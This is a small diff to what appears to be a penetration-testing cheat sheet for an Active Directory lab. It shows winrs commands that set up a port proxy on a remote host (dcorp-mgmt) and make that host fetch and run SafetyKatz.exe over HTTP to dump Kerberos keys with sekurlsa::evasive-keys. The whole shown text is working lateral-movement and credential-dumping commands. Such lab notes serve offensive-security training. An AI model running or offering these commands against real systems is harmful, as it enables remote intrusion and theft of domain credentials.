@@ -108,5 +108,5 @@ Check [transfer-files.md](../misc/transfer-files.md "mention") to get to know mo
 # Setup proxy
 $null | winrs -r:dcorp-mgmt “netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1”
 # Transfer files
-$null | winrs -r:dcorp-mgmt “cmd /c <path_to_store> -path HTTP://<ip>/SafetyKatz.exe sekurlsa::evasive-keys exit”
+$null | winrs -r:dcorp-mgmt “cmd /c <path_to_tool> -path HTTP://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit”
 ```
